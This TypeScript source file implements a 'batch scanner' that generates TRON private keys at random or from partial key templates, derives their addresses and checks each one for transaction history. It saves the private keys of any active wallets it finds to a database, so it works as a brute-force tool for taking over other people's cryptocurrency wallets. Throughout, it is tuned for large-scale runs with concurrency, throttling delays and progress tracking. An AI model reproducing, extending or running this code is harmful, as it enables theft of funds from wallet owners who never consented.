/**
 * Batch Scanner Service
 * Handles multi-threaded scanning of private key templates
 */

import { tronService } from './tron';
import { privateKeyGenerator } from './private-key-generator';
import { storage } from '../storage';
import type { PrivateKeyTemplate, BatchScanResult, WalletInfo } from '@shared/schema';

interface ScanProgress {
  sessionId: number;
  userId: string | null;
  template: string;
  totalGenerated: number;
  totalScanned: number;
  totalFound: number;
  foundWallets: Array<{
    address: string;
    privateKey: string;
    trxBalance: number;
    totalBalanceUsd: number;
  }>;
  isCompleted: boolean;
  isRunning: boolean;
  // Add mutex for thread-safe operations
  countLock: boolean;
}

export class BatchScanner {
  private activeSessions = new Map<number, ScanProgress>();
  private readonly MIN_BALANCE_THRESHOLD = 0.001; // Minimum balance to save wallet
  private readonly MIN_ACTIVITY_THRESHOLD = 1; // Minimum transaction count for active wallet

  /**
   * Atomic counter operations to prevent race conditions
   */
  private async atomicIncrement(sessionId: number, field: 'totalScanned' | 'totalFound'): Promise<void> {
    const progress = this.activeSessions.get(sessionId);
    if (!progress) return;

    // Simple lock mechanism - wait for lock to be released
    while (progress.countLock) {
      await new Promise(resolve => setTimeout(resolve, 10));
    }

    // Acquire lock
    progress.countLock = true;
    
    try {
      // Atomic increment
      progress[field]++;
      
      // Update database immediately for critical operations
      if (field === 'totalFound' || progress.totalScanned % 10 === 0) {
        await storage.updateScanSession(sessionId, {
          totalGenerated: progress.totalGenerated,
          totalScanned: progress.totalScanned,
          totalFound: progress.totalFound,
          lastProgressAt: new Date(),
        });
      }
    } finally {
      // Release lock
      progress.countLock = false;
    }
  }

  /**
   * Safely add found wallet with atomic operations
   */
  private async atomicAddWallet(sessionId: number, walletData: {
    address: string;
    privateKey: string;
    trxBalance: number;
    totalBalanceUsd: number;
  }): Promise<void> {
    const progress = this.activeSessions.get(sessionId);
    if (!progress) return;

    // Wait for lock
    while (progress.countLock) {
      await new Promise(resolve => setTimeout(resolve, 10));
    }

    // Acquire lock
    progress.countLock = true;
    
    try {
      // Add wallet to results
      progress.foundWallets.push(walletData);
      progress.totalFound++;
      
      // Update database immediately for found wallets
      await storage.updateScanSession(sessionId, {
        totalGenerated: progress.totalGenerated,
        totalScanned: progress.totalScanned,
        totalFound: progress.totalFound,
      });
    } finally {
      // Release lock
      progress.countLock = false;
    }
  }

  /**
   * Start a new random scan session (no template)
   */
  async startRandomScan(params: { maxVariations: number; parallelThreads: number; userId?: string }): Promise<BatchScanResult> {
    // Create scan session in database with user association
    const session = await storage.createScanSession({
      template: 'RANDOM_SCAN',
      userId: params.userId, // Associate session with user
    });

    // Initialize progress tracking
    const progress: ScanProgress = {
      sessionId: session.id,
      userId: params.userId,
      template: 'RANDOM_SCAN',
      totalGenerated: 0,
      totalScanned: 0,
      totalFound: 0,
      foundWallets: [],
      isCompleted: false,
      isRunning: true,
      countLock: false,
    };

    this.activeSessions.set(session.id, progress);

    // Start random scanning asynchronously
    this.performRandomScan(session.id, params).catch((error) => {
      console.error(`Random scan ${session.id} failed:`, error);
      this.markSessionCompleted(session.id);
    });

    return this.getProgressResult(progress);
  }

  /**
   * Start a new batch scan session with template
   * For large-scale scanning, use sequential mode for 100% reliability
   */
  async startBatchScan(template: PrivateKeyTemplate & { userId?: string }): Promise<BatchScanResult> {
    // Validate template
    const validation = privateKeyGenerator.validateTemplate(template.template);
    if (!validation.isValid) {
      throw new Error(validation.error || 'Invalid template');
    }

    // Create scan session in database with user association
    const session = await storage.createScanSession({
      template: template.template,
      userId: template.userId, // Associate session with user
    });

    // Initialize progress tracking
    const progress: ScanProgress = {
      sessionId: session.id,
      userId: template.userId,
      template: template.template,
      totalGenerated: 0,
      totalScanned: 0,
      totalFound: 0,
      foundWallets: [],
      isCompleted: false,
      isRunning: true,
      countLock: false,
    };

    this.activeSessions.set(session.id, progress);

    // Choose scan method based on scale
    const isLargeScale = template.maxVariations > 1000;
    const scanMethod = isLargeScale ? 
      this.performSequentialScan(session.id, template) : 
      this.performBatchScan(session.id, template);

    // Start scanning asynchronously
    scanMethod.catch((error) => {
      console.error(`Batch scan ${session.id} failed:`, error);
      this.markSessionCompleted(session.id);
    });

    return this.getProgressResult(progress);
  }

  /**
   * Get current progress of a scan session
   */
  async getScanProgress(sessionId: number): Promise<BatchScanResult | null> {
    const progress = this.activeSessions.get(sessionId);
    if (progress) {
      return this.getProgressResult(progress);
    }

    // Check if session exists in database
    const session = await storage.getScanSession(sessionId);
    if (!session) {
      return null;
    }

    // Return completed session data
    const foundWallets = await storage.getWalletRecordsBySession(sessionId);
    return {
      sessionId,
      totalGenerated: session.totalGenerated,
      totalScanned: session.totalGenerated,
      totalFound: session.totalFound,
      foundWallets: foundWallets.map(w => ({
        address: w.address,
        privateKey: w.privateKey,
        trxBalance: parseFloat(w.trxBalance),
        totalBalanceUsd: parseFloat(w.totalBalanceUsd),
      })),
      isCompleted: !session.isActive,
      progress: 100,
    };
  }

  /**
   * Stop a running scan session
   */
  async stopScanSession(sessionId: number): Promise<boolean> {
    const progress = this.activeSessions.get(sessionId);
    if (progress && progress.isRunning) {
      progress.isRunning = false;
      await this.markSessionCompleted(sessionId);
      return true;
    }
    return false;
  }

  /**
   * Get all active scan sessions
   */
  getActiveSessions(): number[] {
    return Array.from(this.activeSessions.keys());
  }

  /**
   * Perform pure random scanning
   */
  private async performRandomScan(sessionId: number, params: { maxVariations: number; parallelThreads: number }): Promise<void> {
    const progress = this.activeSessions.get(sessionId);
    if (!progress) return;

    const batchSize = 40; // Larger batches for random scanning
    const maxConcurrent = Math.min(params.parallelThreads, 8);

    try {
      const keyBatches = privateKeyGenerator.generateRandomStream(batchSize);
      const semaphore = new Semaphore(maxConcurrent);
      const promises: Promise<void>[] = [];
      let totalGenerated = 0;

      // Use iterator manually
      let batchResult = keyBatches.next();
      while (!batchResult.done && progress.isRunning && totalGenerated < params.maxVariations) {
        const batch = batchResult.value;
        const actualBatchSize = Math.min(batch.length, params.maxVariations - totalGenerated);
        const trimmedBatch = batch.slice(0, actualBatchSize);
        
        progress.totalGenerated += trimmedBatch.length;
        totalGenerated += trimmedBatch.length;

        // Process batch with concurrency control
        const batchPromise = semaphore.acquire().then(async (release) => {
          try {
            await this.processBatch(sessionId, trimmedBatch);
          } finally {
            release();
          }
        });

        promises.push(batchPromise);

        // Update session progress with all data
        if (promises.length % 3 === 0) {
          await storage.updateScanSession(sessionId, {
            totalGenerated: progress.totalGenerated,
            totalScanned: progress.totalScanned,
            totalFound: progress.totalFound,
          });
        }

        if (totalGenerated >= params.maxVariations) {
          break;
        }

        batchResult = keyBatches.next();
      }

      // Wait for all batches to complete
      await Promise.all(promises);

    } catch (error) {
      console.error(`Error in random scan ${sessionId}:`, error);
    } finally {
      await this.markSessionCompleted(sessionId);
    }
  }

  /**
   * Perform 100% reliable sequential scanning (for large-scale operations)
   * Each key is processed one by one to ensure zero data loss
   */
  private async performSequentialScan(sessionId: number, template: PrivateKeyTemplate): Promise<void> {
    const progress = this.activeSessions.get(sessionId);
    if (!progress) return;

    console.log(`\n🔍 Starting SEQUENTIAL scan for maximum reliability`);
    console.log(`Template: ${template.template}`);
    console.log(`Max variations: ${template.maxVariations.toLocaleString()}`);

    try {
      // Generate ALL private keys for the template
      const allKeys = privateKeyGenerator.generateAll(template.template, template.maxVariations);
      progress.totalGenerated = allKeys.length;

      console.log(`📊 Generated ${allKeys.length.toLocaleString()} private keys`);

      // Process keys one by one for maximum reliability
      for (let i = 0; i < allKeys.length; i++) {
        if (!progress.isRunning) break;

        const privateKey = allKeys[i];
        
        try {
          // Steady delay for API stability
          if (i > 0 && i % 10 === 0) {
            await new Promise(resolve => setTimeout(resolve, 1000)); // 1s every 10 keys
          }

          // Generate address
          const address = await tronService.generateAddressFromPrivateKey(privateKey);
          
          // Check transaction history only
          const transactions = await tronService.getRecentTransactions(address);
          
          // Update scan count atomically
          await this.atomicIncrement(sessionId, 'totalScanned');

          // Check activity
          const hasTransactions = transactions.length >= this.MIN_ACTIVITY_THRESHOLD;

          if (hasTransactions) {
            // Try to save to database (handle duplicates gracefully)
            try {
              await storage.saveWalletRecord({
                privateKey,
                address,
                trxBalance: "0",
                trxBalanceUsd: "0",
                tokensCount: 0,
                totalBalanceUsd: "0",
                isActive: true,
                userId: progress.userId || null,
              });
              console.log(`✅ Saved new active wallet: ${address} (${transactions.length} transactions)`);
            } catch (error: any) {
              if (error.code === '23505') {
                // Duplicate address - wallet already exists, this is OK
                console.log(`✅ Found active wallet (already in DB): ${address} (${transactions.length} transactions)`);
              } else {
                console.error(`❌ Error saving wallet ${address}:`, error?.message || error);
                throw error; // Re-throw non-duplicate errors
              }
            }

            // Always count found wallets, even if already in database
            await this.atomicAddWallet(sessionId, {
              address,
              privateKey,
              trxBalance: 0,
              totalBalanceUsd: 0,
            });

            console.log(`🎯 ACTIVE WALLET DETECTED: ${address} (${transactions.length} transactions)`);
          }

          // Progress update every 50 keys
          if (i % 50 === 0) {
            const percent = Math.round((i / allKeys.length) * 100);
            console.log(`📈 Progress: ${i.toLocaleString()}/${allKeys.length.toLocaleString()} (${percent}%) - Found: ${progress.totalFound}`);
          }

        } catch (error) {
          console.error(`❌ Error processing key ${i+1}/${allKeys.length}:`, error);
          await this.atomicIncrement(sessionId, 'totalScanned');
        }
      }

      console.log(`🏁 Sequential scan completed! Scanned: ${progress.totalScanned}, Found: ${progress.totalFound}`);

    } catch (error) {
      console.error(`💥 Sequential scan ${sessionId} failed:`, error);
    } finally {
      await this.markSessionCompleted(sessionId);
    }
  }

  /**
   * Perform the actual batch scanning with template (concurrent mode)
   */
  private async performBatchScan(sessionId: number, template: PrivateKeyTemplate): Promise<void> {
    const progress = this.activeSessions.get(sessionId);
    if (!progress) return;

    const batchSize = 30; // Process 30 keys per batch for better efficiency  
    const maxConcurrent = Math.min(template.parallelThreads, 8); // Allow more concurrent operations

    try {
      // Generate private keys in batches
      const keyBatches = privateKeyGenerator.generateBatches(
        template.template,
        template.maxVariations,
        batchSize
      );

      const semaphore = new Semaphore(maxConcurrent);
      const promises: Promise<void>[] = [];

      // Use iterator manually to avoid downlevelIteration issues
      let batchResult = keyBatches.next();
      while (!batchResult.done && progress.isRunning) {
        const batch = batchResult.value;
        progress.totalGenerated += batch.length;

        // Process batch with concurrency control
        const batchPromise = semaphore.acquire().then(async (release) => {
          try {
            await this.processBatch(sessionId, batch);
          } finally {
            release();
          }
        });

        promises.push(batchPromise);

        // Update session progress every few batches with all data
        if (promises.length % 5 === 0) {
          await storage.updateScanSession(sessionId, {
            totalGenerated: progress.totalGenerated,
            totalScanned: progress.totalScanned,
            totalFound: progress.totalFound,
          });
        }

        batchResult = keyBatches.next();
      }

      // Wait for all batches to complete
      await Promise.all(promises);

    } catch (error) {
      console.error(`Error in batch scan ${sessionId}:`, error);
    } finally {
      await this.markSessionCompleted(sessionId);
    }
  }

  /**
   * Process a batch of private keys with atomic operations for reliability
   */
  private async processBatch(sessionId: number, privateKeys: string[]): Promise<void> {
    const progress = this.activeSessions.get(sessionId);
    if (!progress || !progress.isRunning) return;

    // Process keys sequentially for better reliability in large-scale scans
    for (let i = 0; i < privateKeys.length; i++) {
      const privateKey = privateKeys[i];
      if (!progress.isRunning) break;

      try {
        // Add delay to avoid API throttling - reliability over speed
        if (i > 0) {
          await new Promise(resolve => setTimeout(resolve, 600)); // 600ms delay for stability
        }

        // Generate address from private key
        const address = await tronService.generateAddressFromPrivateKey(privateKey);
        
        // Only check transaction history for activity
        const transactions = await tronService.getRecentTransactions(address);
        
        // Atomic increment for scan count
        await this.atomicIncrement(sessionId, 'totalScanned');

        // Check if wallet has any transaction history (indicating it's active)
        const hasTransactions = transactions.length >= this.MIN_ACTIVITY_THRESHOLD;

        if (hasTransactions) {
          // Try to save active wallet to database (handle duplicates gracefully)
          try {
            await storage.saveWalletRecord({
              privateKey,
              address: address,
              trxBalance: "0", // We don't query balance anymore
              trxBalanceUsd: "0",
              tokensCount: 0, // 使用正确的字段名
              totalBalanceUsd: "0",
              isActive: true,
              userId: progress.userId || null, // Associate with the user who started the scan
            });
            console.log(`✅ Saved new active wallet: ${address} (${transactions.length} transactions)`);
          } catch (error: any) {
            if (error.code === '23505') {
              // Duplicate address - wallet already exists, this is OK
              console.log(`✅ Found active wallet (already in DB): ${address} (${transactions.length} transactions)`);
            } else {
              console.error(`❌ Error saving wallet ${address}:`, error?.message || error);
              throw error; // Re-throw non-duplicate errors
            }
          }

          // Always count found wallets, even if already in database
          await this.atomicAddWallet(sessionId, {
            address: address,
            privateKey,
            trxBalance: 0,
            totalBalanceUsd: 0,
          });

          console.log(`🎯 ACTIVE WALLET DETECTED: ${address} (${transactions.length} transactions)`);
        }

      } catch (error) {
        console.error(`Error checking private key ${privateKey.slice(0, 8)}...`, error);
        // Even on error, increment scan count atomically
        await this.atomicIncrement(sessionId, 'totalScanned');
      }
    }
  }

  /**
   * Simplified: Only check if address has any transaction history
   * This reduces API calls from 4-6 to just 1 per address
   */
  private async checkAddressActivity(address: string): Promise<boolean> {
    try {
      const transactions = await tronService.getRecentTransactions(address);
      return transactions.length >= this.MIN_ACTIVITY_THRESHOLD;
    } catch (error) {
      console.error(`Error checking activity for ${address}:`, error);
      return false;
    }
  }

  /**
   * Mark scan session as completed
   */
  private async markSessionCompleted(sessionId: number): Promise<void> {
    const progress = this.activeSessions.get(sessionId);
    if (progress) {
      progress.isCompleted = true;
      progress.isRunning = false;

      await storage.completeScanSession(sessionId, progress.totalFound, progress.totalScanned);
      
      // Keep session in memory for a short time for final queries
      setTimeout(() => {
        this.activeSessions.delete(sessionId);
      }, 60000); // Remove after 1 minute
    }
  }

  /**
   * Convert progress to result format
   */
  private getProgressResult(progress: ScanProgress): BatchScanResult {
    const progressPercentage = progress.totalGenerated > 0 
      ? Math.round((progress.totalScanned / progress.totalGenerated) * 100)
      : 0;

    return {
      sessionId: progress.sessionId,
      totalGenerated: progress.totalGenerated,
      totalScanned: progress.totalScanned,
      totalFound: progress.totalFound,
      foundWallets: progress.foundWallets,
      isCompleted: progress.isCompleted,
      progress: Math.min(progressPercentage, 100),
    };
  }
}

/**
 * Simple semaphore for concurrency control
 */
class Semaphore {
  private permits: number;
  private waiting: Array<() => void> = [];

  constructor(permits: number) {
    this.permits = permits;
  }

  async acquire(): Promise<() => void> {
    return new Promise((resolve) => {
      if (this.permits > 0) {
        this.permits--;
        resolve(() => this.release());
      } else {
        this.waiting.push(() => {
          this.permits--;
          resolve(() => this.release());
        });
      }
    });
  }

  private release(): void {
    this.permits++;
    if (this.waiting.length > 0) {
      const next = this.waiting.shift();
      if (next) next();
    }
  }
}

export const batchScanner = new BatchScanner();